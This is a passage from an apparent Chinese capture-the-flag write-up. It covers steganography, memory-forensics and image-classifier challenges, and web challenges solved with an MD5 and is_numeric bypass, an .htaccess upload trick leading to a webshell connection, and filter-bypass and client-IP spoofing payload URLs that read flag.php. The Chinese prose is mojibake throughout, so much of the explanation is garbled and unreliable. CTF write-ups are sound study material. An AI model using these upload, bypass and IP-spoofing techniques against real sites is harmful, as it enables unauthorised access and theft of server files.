\u0026#39;liberty\u0026#39;, \u0026#39;maritime\u0026#39;, \u0026#39;matchmaker\u0026#39;, \u0026#39;maverick\u0026#39;, \u0026#39;Medusa\u0026#39;, \u0026#39;megaton\u0026#39;, \u0026#39;microscope\u0026#39;, \u0026#39;microwave\u0026#39;, \u0026#39;midsummer\u0026#39;, \u0026#39;millionaire\u0026#39;, \u0026#39;miracle\u0026#39;, \u0026#39;misnomer\u0026#39;, \u0026#39;molasses\u0026#39;, \u0026#39;molecule\u0026#39;, \u0026#39;Montana\u0026#39;, \u0026#39;monument\u0026#39;, \u0026#39;mosquito\u0026#39;, \u0026#39;narrative\u0026#39;, \u0026#39;nebula\u0026#39;, \u0026#39;newsletter\u0026#39;, \u0026#39;Norwegian\u0026#39;, \u0026#39;October\u0026#39;, \u0026#39;Ohio\u0026#39;, \u0026#39;onlooker\u0026#39;, \u0026#39;opulent\u0026#39;, \u0026#39;Orlando\u0026#39;, \u0026#39;outfielder\u0026#39;, \u0026#39;Pacific\u0026#39;, \u0026#39;pandemic\u0026#39;, \u0026#39;Pandora\u0026#39;, \u0026#39;paperweight\u0026#39;, \u0026#39;paragon\u0026#39;, \u0026#39;paragraph\u0026#39;, \u0026#39;paramount\u0026#39;, \u0026#39;passenger\u0026#39;, \u0026#39;pedigree\u0026#39;, \u0026#39;Pegasus\u0026#39;, \u0026#39;penetrate\u0026#39;, \u0026#39;perceptive\u0026#39;, \u0026#39;performance\u0026#39;, \u0026#39;pharmacy\u0026#39;, \u0026#39;phonetic\u0026#39;, \u0026#39;photograph\u0026#39;, \u0026#39;pioneer\u0026#39;, \u0026#39;pocketful\u0026#39;, \u0026#39;politeness\u0026#39;, \u0026#39;positive\u0026#39;, \u0026#39;potato\u0026#39;, \u0026#39;processor\u0026#39;, \u0026#39;provincial\u0026#39;, \u0026#39;proximate\u0026#39;, \u0026#39;puberty\u0026#39;, \u0026#39;publisher\u0026#39;, \u0026#39;pyramid\u0026#39;, \u0026#39;quantity\u0026#39;, \u0026#39;racketeer\u0026#39;, \u0026#39;rebellion\u0026#39;, \u0026#39;recipe\u0026#39;, \u0026#39;recover\u0026#39;, \u0026#39;repellent\u0026#39;, \u0026#39;replica\u0026#39;, \u0026#39;reproduce\u0026#39;, \u0026#39;resistor\u0026#39;, \u0026#39;responsive\u0026#39;, \u0026#39;retraction\u0026#39;, \u0026#39;retrieval\u0026#39;, \u0026#39;retrospect\u0026#39;, \u0026#39;revenue\u0026#39;, \u0026#39;revival\u0026#39;, \u0026#39;revolver\u0026#39;, \u0026#39;sandalwood\u0026#39;, \u0026#39;sardonic\u0026#39;, \u0026#39;Saturday\u0026#39;, \u0026#39;savagery\u0026#39;, \u0026#39;scavenger\u0026#39;, \u0026#39;sensation\u0026#39;, \u0026#39;sociable\u0026#39;, \u0026#39;souvenir\u0026#39;, \u0026#39;specialist\u0026#39;, \u0026#39;speculate\u0026#39;, \u0026#39;stethoscope\u0026#39;, \u0026#39;stupendous\u0026#39;, \u0026#39;supportive\u0026#39;, \u0026#39;surrender\u0026#39;, \u0026#39;suspicious\u0026#39;, \u0026#39;sympathy\u0026#39;, \u0026#39;tambourine\u0026#39;, \u0026#39;telephone\u0026#39;, \u0026#39;therapist\u0026#39;, \u0026#39;tobacco\u0026#39;, \u0026#39;tolerance\u0026#39;, \u0026#39;tomorrow\u0026#39;, \u0026#39;torpedo\u0026#39;, \u0026#39;tradition\u0026#39;, \u0026#39;travesty\u0026#39;, \u0026#39;trombonist\u0026#39;, \u0026#39;truncated\u0026#39;, \u0026#39;typewriter\u0026#39;, \u0026#39;ultimate\u0026#39;, \u0026#39;undaunted\u0026#39;, \u0026#39;underfoot\u0026#39;, \u0026#39;unicorn\u0026#39;, \u0026#39;unify\u0026#39;, \u0026#39;universe\u0026#39;, \u0026#39;unravel\u0026#39;, \u0026#39;upcoming\u0026#39;, \u0026#39;vacancy\u0026#39;, \u0026#39;vagabond\u0026#39;, \u0026#39;vertigo\u0026#39;, \u0026#39;Virginia\u0026#39;, \u0026#39;visitor\u0026#39;, \u0026#39;vocalist\u0026#39;, \u0026#39;voyager\u0026#39;, \u0026#39;warranty\u0026#39;, \u0026#39;Waterloo\u0026#39;, \u0026#39;whimsical\u0026#39;, \u0026#39;Wichita\u0026#39;, \u0026#39;Wilmington\u0026#39;, \u0026#39;Wyoming\u0026#39;, \u0026#39;yesteryear\u0026#39;, \u0026#39;Yucatan\u0026#39;] for i in range(len(cipher)): for j in range(len(odd_list)): if odd_list[j] == cipher[i]: cipher[i:i+1] = chr(j) for k in range(len(even_list)): if odd_list[k] == cipher[i]: cipher[i:i+1] = chr(k) for i in cipher: print(i,end=\u0026#39;\u0026#39;) GitHubæ‰¾åˆ°ä¸ªstegpyçš„é¡¹ç›®\n1 pip3 install stegpy 1 2 $ stegpy.exe encode.webp the_password_is:Yus@_1s_YYddddsstegpy encode.webp the_key_is:Yus@_yydsstegpy!! å¾—åˆ°ä¸¤ä¸ªå¯†ç  éƒ½è¯•äº†ä¸€ä¸‹ ç¬¬äºŒä¸ªèƒ½è§£hint.rarå¾—åˆ°ä¸€ä¸ªhint.jpg\nå®˜æ–¹æ”¾äº†ä¸ªhintï¼šinvisible ä¸ç„¶æˆ‘è¦éª‚äººäº†ã€‚InvisibleSecreéšå†™ åå†›ä¸Šä¸‹äº†ä¸€ä¸ªå¾ˆå¤è€çš„è½¯ä»¶ã€‚ã€‚ã€‚ã€‚\nç½‘é¡µæºç é‡Œè¯´\u0026quot;Yusa\u0026quot;åœ¨è¿™é¢˜å¾ˆé‡è¦ ç”¨\u0026quot;Yusa\u0026quot;è§£å¯†ï¼ŒåŠ å¯†ç®—æ³•é€‰æœ€åä¸€ä¸ªï¼Œå¾—åˆ°encodeè„šæœ¬\nç®€å•åˆ†æä¸€ä¸‹æ˜¯ç”Ÿæˆä¸¤ä¸ªéšæœºå¯†é’¥æµ ç„¶åè·Ÿflag.png æ¯åƒç´ å¼‚æˆ– ç„¶åç”¨lsbåŸç†å¾€source.pngåƒç´ é‡ŒåŠ flag.png æµ1åŠ å¯†åœ¨Ré€šé“ æµ2åŠ å¯†åœ¨Gé€šé“ encå†™åˆ°Bé€šé“\nè§£å¯†åªéœ€å„ä¸ªå–å‡ºæœ€åä¸€ä½ ç„¶åå¼‚æˆ–å›æ¥å°±æ˜¯flagäº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from PIL import Image en_p = Image.open(\u0026#39;./encode.png\u0026#39;).convert(\u0026#39;RGB\u0026#39;) a,b = en_p.size R=[] G=[] B=[] key1stream = [] key2stream = [] enc = [] flag = [] for x in range(a): for y in range(b): tmp = en_p.getpixel((x,y)) R.append(tmp[0]) G.append(tmp[1]) B.append(tmp[2]) # å–å‡ºlsbæ•°æ® for i in range(len(R)): if bin(R[i])[-1] == \u0026#39;1\u0026#39;: key1stream.append(1) else: key1stream.append(0) if bin(G[i])[-1] == \u0026#39;1\u0026#39;: key2stream.append(1) else: key2stream.append(0) if bin(B[i])[-1] == \u0026#39;1\u0026#39;: enc.append(1) else: enc.append(0) # æ¢å¤flag for i in range(len(enc)): flag.append(enc[i]^key1stream[i]^key2stream[i]) # ç®€å•ç”»ä¸€ä¸‹ img = Image.new(\u0026#39;RGB\u0026#39;,(a,b),(255,255,255)) for x in range(a): for y in range(b): if flag[y+x*b] == 0: img.putpixel((x,y),(0,0,0)) else: img.putpixel((x,y),(255,255,255)) img.save(\u0026#39;flag.png\u0026#39;) æŒ‡é¹¿ä¸ºé©¬ CNN æˆ‘ç»§ç»­çˆ¬\næ®è¯´psä¸€ä¸‹ä¹Ÿæˆï¼Œæ²¡æˆåŠŸï¼Œå‘œå‘œå‘œ\nopencvæ”¹ä¸‹é€æ˜åº¦ æ‹¼ä¸€ä¸‹å›¾\n1 2 3 4 5 6 import cv2 as cv alpha = 0.5 horse = cv.imread(\u0026#39;horse.png\u0026#39;) deer = cv.imread(\u0026#39;deer.png\u0026#39;) dst = cv.addWeighted(horse, alpha, deer, 0.4, 0.0) cv.imwrite(\u0026#39;image.png\u0026#39;, dst) å¤ç°çš„æ—¶å€™é¶æœºå·²ç»å…³äº†ï¼Œæœ¬åœ°é­”æ”¹äº†ä¸€ä¸‹èƒ½è·‘å‡ºæ¥ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 def main(): while 1: pic = base64.b64encode(open(\u0026#39;./image.png\u0026#39;, \u0026#34;rb\u0026#34;).read()) try: pic = base64.b64decode(pic) except: exit() if b\u0026#34;\u0026lt;?php\u0026#34; in pic or b\u0026#39;eval\u0026#39; in pic: print(\u0026#34;Hacker!!This is not WEB,It`s Just a misc!!!\u0026#34;) exit() salt = str(random.getrandbits(15)) pic_name = \u0026#39;tmp_\u0026#39;+salt+\u0026#39;.png\u0026#39; tmp_pic = open(pic_name,\u0026#39;wb\u0026#39;) tmp_pic.write(pic) tmp_pic.close() ma = load_horse() lu = load_deer() k = 1 trainingSet = np.append(ma, lu).reshape(2, 5185) testSet = load_test(pic_name) neighbors = getNeighbors(trainingSet, testSet[0], k) result = getResponse(neighbors) if repr(result) == \u0026#39;0\u0026#39;: print(\u0026#39;Yes,I want this horse like deer,here is your flag encoded by base64\u0026#39;) flag = base64.b64encode(open(\u0026#39;flag\u0026#39;,\u0026#39;rb\u0026#39;).read()) print(flag.decode()) os.remove(pic_name) break else: print(\u0026#39;I want horse but not deer!!!\u0026#39;) os.remove(pic_name) break exit() Barbar å¾—åˆ°ä¸€ä¸ªé™„ä»¶è¶…å¤§QRcodeï¼ŒCQRæ‰«ç çœ‹åˆ°ä¸€ä¸²é—®å·ï¼Œå¾®ä¿¡æ‰«ç å´æ²¡çœ‹åˆ°ï¼Œç¬¬ä¸€ååº”å°±æ˜¯é›¶å®½å­—ç¬¦ã€‚\nä½†æ˜¯ä¸€å¼€å§‹æ‰¾çš„ç½‘ç«™è§£å¯†é”™è¯¯å¾—åˆ°é”™çš„ï¼Œç„¶åæ•´ä¸ªé¢˜ç›®æ¯«æ— è¿›å±•ã€‚æœ€åå¾—åˆ°ä¸€ä¸ªèƒ½æ­£ç¡®è§£çš„ç½‘ç«™ã€‚ã€‚ã€‚ã€‚wsfwæ²¡é”™äº†\n1 2 False:ntentteanetekettterieeenaeatttedtttt True:YcfVgMBUraXftwO6Cp92YBGAbyRyWNOO è§£å‹å¾—åˆ°ä¸€ä¸ªç ´æŸäºŒç»´ç å’Œä¸€ä¸ªdocxï¼Œä¿®å¤äºŒç»´ç æ‰«æå¾—åˆ°è¿™ä¸ªï¼Œæˆ‘é€ï¼\ndocxä¸¢kaliåœ¨document.xmlé‡Œæ‰¾åˆ°ä¸€ä¸²base64\nå»æ‰ä¸­é—´çš„å­—ç¬¦åè§£ç å¾—åˆ°ä¸€ä¸ªAztec Code\nå¯ä»¥åœ¨çº¿è§£ç å¾—åˆ°ä¸€ä¸²flagç±»ä¼¼ç‰©\ndi`f{e1c64e14db14c6bb8faabab5bd7be1dc} è‡³æ­¤æ— åç»­äº†ï¼Œåªæœ‰æ„Ÿè§‰æ²¡ç”¨åˆ°é¢˜ç›®hintï¼šbarå’Œbarä¹‹é—´æœ‰ç€éåŒå¯»å¸¸çš„è”ç³»\næ„Ÿè§‰é‚£ä¸ªä¿®å¤çš„äºŒç»´ç é‡Œè¿˜æœ‰ä¸œè¥¿\nå¥½äº†ï¼Œå®˜æ–¹å‡ºwpäº†ï¼Œæˆ‘æ˜¯åºŸç‰©ï¼Œä½¿ç”¨npietå‡ºflag\nç¬¬ä¸€å±Šå¤ªæ¹–æ¯Miscé¢˜è§£ memory ç­¾åˆ°é¢˜\n1 2 3 4 é—®windowsåŠ¨æ€é“¾æ¥åº“ç®¡å®¶å§ï¼Œä»–ä¼šå‘Šè¯‰ä½ answer åŸå§‹é¢˜ç›®ä¸‹è½½åœ°å€ï¼šhttps://pan.baidu.com/s/1tmM-wjyMZ_SHdDJ82Qaq7A(3qci) æå‰ä¸‹å‘çš„é¢˜ç›®å‹ç¼©åŒ…å¯†ç ï¼šwelc0me_to_Asuri_w0rld é¢˜ç›®ç»™çš„hintæ„Ÿè§‰æœ‰è¯¯å¯¼æ€§ï¼Œæç¤ºçœ‹dllï¼Œç„¶æ˜¯åˆ—äº†ä¸€ä¸‹å•¥ä¹Ÿçœ‹ä¸å‡ºã€‚ç„¶åå»ç»™åšäº†webç­¾åˆ°é¢˜ï¼Œçœ‹äº†å…¶ä½™ä¸¤ä¸ªmiscå¤§è‡´å•¥æ ·ï¼Œå›æ¥ç»§ç»­åšã€‚\n1 2 3 4 5 6 # iehistoryçœ‹åˆ°æ¡Œé¢çš„Desktop/Untitled.png volatility -f dump --profile=Win7SP1x86 iehistory # filescançœ‹ä¸€ä¸‹åœ°å€ volatility -f dump --profile=Win7SP1x86 filescan | grep \u0026#34;Untitled.png\u0026#34; # dumpfileså¼„ä¸‹å›¾ç‰‡ é‡Œé¢å°±æ˜¯flag volatility -f dump --profile=Win7SP1x86 dumpfiles -Q 0x000000003fdf6118 -D ./ æ‹¿äº†ä¸ªä¸€è¡€è¿˜æ˜¯å¾ˆé¦™çš„\nmisc è¿™æ˜¯æœ€è®©äººè›‹ç–¼çš„ä¸€é¢˜ï¼Œè¿™é¢˜å‡ºçš„çœŸä¸å¤ªè¡Œã€‚\nå¾—åˆ°ä¸€ä¸ªzipï¼Œè§£å‹å¯ä»¥å¾—åˆ°fun.zip åŒæ—¶ä¼ªåŠ å¯†å¯ä»¥å¾—åˆ°omisc.docx\ndocxé‡Œæœ‰ä¸¤è¡Œéšè—æ–‡å­—\n1 2 waoootu.epj,nv o www.verymuch.net å‰é¢ä¸€ç›´æ²¡äººè§£å‡ºæ¥ï¼ŒçŸ¥é“ç»™äº†hintæ˜¯å¸Œå°”å¯†ç ï¼Œä½¿ç”¨åœ¨çº¿å·¥å…·è§£å¾—\n1 love and peaceee rabiitè§£å¯†å¾—åˆ°\n1 LR2TMNLCGBOHKNDGGVRFY5JWGZTDAXDVMZTDCYK4OU4GCZRYLR2TSNTCHBOHKNJUMM4VY5JVGBSTOXDVHE3DIZC4OU2TIM3ELR2TQYLGHBOHKOJWGQYFY5JWGQ3DSXDVHE3GEOC4OU2TAZJXLR2TOZRTMROHKOBVME4VY5JVGRQTIXDVHAYDEOC4OU4GCZRYLR2TSNTCHBOHKNRRGY3VY5JVHA2WKXDVHAZDOMS4OU2WGMDBLR2TKNDDHFOHKODGMU3FY5JYMFSTMXDVG5QTOYK4OU3DENBQLR2TSNRUMROHKNRSGEYVY5JVMZTDKXDVHE3GEOC4OU3TSNJXLR2TQYLFGZOHKNLGMY2VY5JVGRRTSXDVHE3DIMC4OU2TMYRULR2TKNDDHFOHKNJWMM4VY5JUMZSWKXDVGU4TGN24OU4TMM3GLR2TMY3FGJOHKOBSG4ZFY5JYGM4GCXDVGVRGGMS4OU4GCZJWLR2TKOBVMVOHKNJUHEZFY5JYGM4GCXDVG43TGZK4OU3DEMJRLR2TKNDDHFOHKNRSGQYFY5JUMYYGMXDVHAYDKZK4OU4DKYJZLR2TSNTCHBOHKNRRGBSFY5JZGVRWIXDVGU2DGNS4OU3DENBQLR2TIZTFMVOHKNRWGJTFY5JYGI3TEXDVGY2DMOK4OU4GCMZWLR2TKNTCGROHKNJUMM4VY5JZHA2TQXDVGYYTAZC4OU2TIYZZLR2TKMZXGNOHKNDGMVSVY5JVGRRTSXDVG5QTOYK4OU4DOMLDLR2TSNRUGBOHKNJWMM4VY5JUMYYGMXDVGVTGMNK4OU2TIYZZLR2TMNBWHFOHKNJUMM4VY5JUMVQTMXDVHAZTQYK4OU2TIYZZLR2TONZTMVOHKNJUME2FY5JVHE4DEXDVHE4DKOC4OU2TSOBS base32å¾—åˆ°\n1 b\u0026#39;\\\\u65b0\\\\u4f5b\\\\u66f0\\\\uff1a\\\\u8af8\\\\u96b8\\\\u54c9\\\\u50e7\\\\u964d\\\\u543d\\\\u8af8\\\\u9640\\\\u6469\\\\u96b8\\\\u50e7\\\\u7f3d\\\\u85a9\\\\u54a4\\\\u8028\\\\u8af8\\\\u96b8\\\\u6167\\\\u585e\\\\u8272\\\\u5c0a\\\\u54c9\\\\u8fe6\\\\u8ae6\\\\u7a7a\\\\u6240\\\\u964d\\\\u6211\\\\u5ff5\\\\u96b8\\\\u7957\\\\u8ae6\\\\u5ff5\\\\u54c9\\\\u9640\\\\u56b4\\\\u54c9\\\\u56c9\\\\u4fee\\\\u5937\\\\u963f\\\\u6ce2\\\\u8272\\\\u838a\\\\u5bc2\\\\u8ae6\\\\u585e\\\\u5492\\\\u838a\\\\u773e\\\\u6211\\\\u54c9\\\\u6240\\\\u4f0f\\\\u805e\\\\u85a9\\\\u96b8\\\\u610d\\\\u95cd\\\\u5436\\\\u6240\\\\u4fee\\\\u662f\\\\u8272\\\\u6469\\\\u8a36\\\\u56b4\\\\u54c9\\\\u9858\\\\u610d\\\\u54c9\\\\u5373\\\\u4fee\\\\u54c9\\\\u7a7a\\\\u871c\\\\u9640\\\\u56c9\\\\u4f0f\\\\u5ff5\\\\u54c9\\\\u6469\\\\u54c9\\\\u4ea6\\\\u838a\\\\u54c9\\\\u773e\\\\u54a4\\\\u5982\\\\u9858\\\\u5982\u0026#39; unicodeå¾—åˆ°\n1 æ–°ä½›æ›°ï¼šè«¸éš¸å“‰åƒ§é™å½è«¸é™€æ‘©éš¸åƒ§ç¼½è–©å’¤è€¨è«¸éš¸æ…§å¡è‰²å°Šå“‰è¿¦è«¦ç©ºæ‰€é™æˆ‘å¿µéš¸ç¥—è«¦å¿µå“‰é™€åš´å“‰å›‰ä¿®å¤·é˜¿æ³¢è‰²èŠå¯‚è«¦å¡å’’èŠçœ¾æˆ‘å“‰æ‰€ä¼èè–©éš¸æ„é—å¶æ‰€ä¿®æ˜¯è‰²æ‘©è¨¶åš´å“‰é¡˜æ„å“‰å³ä¿®å“‰ç©ºèœœé™€å›‰ä¼å¿µå“‰æ‘©å“‰äº¦èŠå“‰çœ¾å’¤å¦‚é¡˜å¦‚ æ–°ä½›æ›°å¾—åˆ°\n1 Live beautifully, dream passionately, love completely. è§£å¯†å‰é¢çš„zipå¾—åˆ°éŸ³é¢‘ï¼Œé¢‘è°±å›¾å°±æ˜¯flag\nbroken_secret ç»™äº†ä¸ªhintï¼šå›¾ä¸Šä¿¡æ¯å¾ˆé‡è¦\nè¿™é¢˜æœ€åå°±å››ä¸ªè§£ï¼Œæˆ‘æ²¡è§£å‡ºæ¥ã€‚\nè§£å‹å¾—åˆ°ä¸èƒ½æ‰“å¼€çš„pdfï¼Œå‘ç°é‡Œé¢objçš„oè¢«æ›¿æ¢ä¹˜äº†@ï¼Œæ¢å›æ¥å°±èƒ½æ­£å¸¸æ‰“å¼€äº†ï¼Œæœ‰ä¸ªfakeflagï¼Œç„¶åé‡Œé¢å¥½åƒè¿˜æœ‰ä¸¤ä¸ªstreamæ²¡æœ‰è¢«è§£æï¼Œä¸ä¼šåšäº†ã€‚\n2020MRCTF writeup ez_bypass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 \u0026lt;?php I put something in F12 for you include \u0026#39;flag.php\u0026#39;; $flag=\u0026#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#39;; if(isset($_GET[\u0026#39;gg\u0026#39;])\u0026amp;\u0026amp;isset($_GET[\u0026#39;id\u0026#39;])) { $id=$_GET[\u0026#39;id\u0026#39;]; $gg=$_GET[\u0026#39;gg\u0026#39;]; if (md5($id) === md5($gg) \u0026amp;\u0026amp; $id !== $gg) { echo \u0026#39;You got the first step\u0026#39;; if(isset($_POST[\u0026#39;passwd\u0026#39;])) { $passwd=$_POST[\u0026#39;passwd\u0026#39;]; if (!is_numeric($passwd)) { if($passwd==1234567) { echo \u0026#39;Good Job!\u0026#39;; highlight_file(\u0026#39;flag.php\u0026#39;); die(\u0026#39;By Retr_0\u0026#39;); } else { echo \u0026#34;can you think twice??\u0026#34;; } } else{ echo \u0026#39;You can not get it !\u0026#39;; } } else{ die(\u0026#39;only one way to get the flag\u0026#39;); } } else { echo \u0026#34;You are not a real hacker!\u0026#34;; } } else{ die(\u0026#39;Please input first\u0026#39;); } }Please input first æºç ç®€å•åˆ†æå°±æ˜¯è¦md5ç»•è¿‡+is_numericç»•è¿‡\nä½ ä¼ ä½ ğŸå‘¢ å°è¯•ä»¥åå‘ç°åªèƒ½ä¸Šä¼ å›¾ç‰‡ å›¾ç‰‡ä¸Šä¼ åä½†æ˜¯è¿ä¸ä¸Š\nå°è¯•ä¸Šä¼ å…¶ä»–æ–‡ä»¶ä½†æ˜¯å…¨éƒ½ä¸è¡Œ è€ƒè™‘ .htaccess å…è®¸ä¸Šä¼ \nä½†æ˜¯ .htaccess ä¹Ÿä¸èƒ½ä¼  ä¼ ä¸ªå›¾ç‰‡æŠ“åŒ…æ”¹ä¸‹ .htaccess\næœ€åå†ä¼ ä¸ªå›¾ç‰‡æ”¹æˆ ma.ma å°±ä¸Šä¼ æˆåŠŸäº† å‡†å¤‡èšå‰‘\næœ‰æ—¶å€™èƒ½è¿æˆåŠŸæœ‰æ—¶å€™ç–¯ç‹‚æŠ¥é”™è¿ä¸Šåä¹Ÿå¾ˆæ»¡å¾ˆæ…¢ã€‚ã€‚ã€‚\næœ€åæ‰¾åˆ°åœ¨flagåœ¨æ ¹ç›®å½•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # è¿ä¸Šåèƒ½çœ‹åˆ°çš„upload.php \u0026lt;?php session_start(); echo \u0026#34; \u0026lt;meta charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026#34;; if(!isset($_SESSION[\u0026#39;user\u0026#39;])){ $_SESSION[\u0026#39;user\u0026#39;] = md5((string)time() . (string)rand(100, 1000)); } if(isset($_FILES[\u0026#39;uploaded\u0026#39;])) { $target_path = getcwd() . \u0026#34;/upload/\u0026#34; . md5($_SESSION[\u0026#39;user\u0026#39;]); $t_path = $target_path . \u0026#34;/\u0026#34; . basename($_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;name\u0026#39;]); $uploaded_name = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;name\u0026#39;]; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name,\u0026#39;.\u0026#39;) + 1); $uploaded_size = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;size\u0026#39;]; $uploaded_tmp = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if(preg_match(\u0026#34;/ph/i\u0026#34;, strtolower($uploaded_ext))){ die(\u0026#34;æˆ‘æ‰Œyour problem?\u0026#34;); } else{ if ((($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34; \u0026#34;) || ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/pjpeg\u0026#34;)|| ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 2048)){ $content = file_get_contents($uploaded_tmp); mkdir(iconv(\u0026#34;UTF-8\u0026#34;, \u0026#34;GBK\u0026#34;, $target_path), 0777, true); move_uploaded_file($uploaded_tmp, $t_path); echo \u0026#34;{$t_path} succesfully uploaded!\u0026#34;; } else{ die(\u0026#34;æˆ‘æ‰Œyour problem?\u0026#34;); } } } ?\u0026gt; PYwebsite ç¬¬ä¸€çœ¼çœ‹åˆ°é¢˜ç›®è¿˜ä»¥ä¸ºæ˜¯pyå†™çš„website ç»“æœæ˜¯è¿™é¢˜å¯ä»¥ä»˜é’±py å“ˆå“ˆæœ‰ç‚¹æ„æ€\nå…¶å®æˆ‘åœ¨é¦–é¡µçœ‹äº†æŒºä¹…çš„ å•¥ä¹Ÿæ²¡æœ‰ã€‚ã€‚ã€‚ã€‚\nç„¶åçœ‹äº†ä¸€ä¸‹ Target çœ¼å‰ä¸€äº®\næŠ“åŒ…è¯´ä»–è‡ªå·±å¯ä»¥è·å¾— å¾ˆæ˜æ˜¾çš„xffäº†\næ”¹ä¸‹xffè½»æ¾è·å–flag\nå¥—å¨ƒ å°±å¥—å¨ƒå‘—ã€‚ã€‚ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 #ç¬¬ä¸€å±‚ #payloadâ€”â€”http://5772a629-7e5b-45aa-9414-ce874dd6d4ab.merak-ctf.site/?b.u.p.t=23333%0a #phpè§£æä¼šæŠŠ . è§£ææˆ _ #æœ‰å¸ˆå‚…è¯´è¿™é‡Œåªè¿‡æ»¤äº† %0f å…¶å®ç”¨ %0F ä¹Ÿå¯ä»¥ç»•è¿‡ ä½†æ˜¯æˆ‘è¯•äº†ä¸è¡Œ \u0026lt;?php $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if( substr_count($query, \u0026#39;_\u0026#39;) !== 0 || substr_count($query, \u0026#39;%5f\u0026#39;) != 0 ){ die(\u0026#39;Y0u are So cutE!\u0026#39;); } if($_GET[\u0026#39;b_u_p_t\u0026#39;] !== \u0026#39;23333\u0026#39; \u0026amp;\u0026amp; preg_match(\u0026#39;/^23333$/\u0026#39;, $_GET[\u0026#39;b_u_p_t\u0026#39;])){ echo \u0026#34;you are going to the next ~\u0026#34;; } æç¤ºflagåœ¨secrettw.php æŸ¥çœ‹æºç  æ˜¯js consoleè·‘ä¸€ä¸‹ æç¤ºä¼  Merak(æœ¬æ¥æˆ‘çœ‹åˆ°é¡µé¢çš„ipè¿˜ä»¥ä¸ºè¦æ”¹xffå‘¢ ç»“æœä¼ ä¸ªå‚å°±è¡Œ)\nä¼ å‚127.0.0.1å‡ºæºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #ç¬¬äºŒå±‚ #payloadâ€”â€”http://e89f0e7e-b386-4abc-b337-95227c876cf3.merak-ctf.site/secrettw.php?2333=%64%61%74%61%3a%2c%74%6f%64%61%74%20%69%73%20%61%20%68%61%70%70%79%20%64%61%79\u0026amp;file=ZmpdYSZmXGI= \u0026lt;?php error_reporting(0); include \u0026#39;takeip.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;.\u0026#39;); #ä¸ºæ‰“å¼€æ–‡ä»¶è®¾ç½®é»˜è®¤å½“å‰æ–‡ä»¶å¤¹ include \u0026#39;flag.php\u0026#39;; if(isset($_POST[\u0026#39;Merak\u0026#39;])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = \u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo \u0026#39;Local access only!\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; $ip = getIp(); if($ip!=\u0026#39;127.0.0.1\u0026#39;) echo \u0026#34;Sorry,you don\u0026#39;t have permission! Your ip is :\u0026#34;.$ip; if($ip === \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; file_get_contents($_GET[\u0026#39;2333\u0026#39;]) === \u0026#39;todat is a happy day\u0026#39; ){ echo \u0026#34;Your REQUEST is:\u0026#34;.change($_GET[\u0026#39;file\u0026#39;]); echo file_get_contents(change($_GET[\u0026#39;file\u0026#39;])); } ?\u0026gt; è¿™é‡Œæœ‰ä¸ªé€†å‘\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #ord â€” è½¬æ¢å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º 0-255 ä¹‹é—´çš„å€¼ #chr â€” è¿”å›æŒ‡å®šçš„å­—ç¬¦ #ä¸¤ä¸ªæ˜¯äº’è¡¥çš„ æ•´ä¸ªæ„æ€å°±æ˜¯ #$_GET[\u0026#39;file\u0026#39;]æœ€åè¦å˜æˆflag.php #1.base64è§£ç  #2.é€ä½ordååŠ 02468....åè¿”å› #ç¨å¾®æ”¹ä¸€ä¸‹å†™ä¸ªphpè„šæœ¬å°±è¡Œ $v=\u0026#34;flag.php\u0026#34;; function change($v){ $re = \u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ // $re .= chr ( ord ($v[$i]) + $i*2 ); $re .= chr ( ord ($v[$i]) - $i*2 ); } return $re; } echo base64_encode(change($v)); è¿™é¢˜æ”¹xffæ˜¯ä¸è¡Œçš„ è¦æ”¹ client-ip åŸå› çœ‹æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #takeip.php \u0026lt;?php function getIp() { if ($_SERVER[\u0026#34;HTTP_CLIENT_IP\u0026#34;] \u0026amp;\u0026amp; strcasecmp($_SERVER[\u0026#34;HTTP_CLIENT_IP\u0026#34;], \u0026#34;unknown\u0026#34;)) { $ip = $_SERVER[\u0026#34;HTTP_CLIENT_IP\u0026#34;]; } else { if ($_SERVER[\u0026#34;HTTP_X_FORWARDED_FOR\u0026#34;] \u0026amp;\u0026amp; strcasecmp($_SERVER[\u0026#34;HTTP_X_FORWARDED_FOR\u0026#34;], 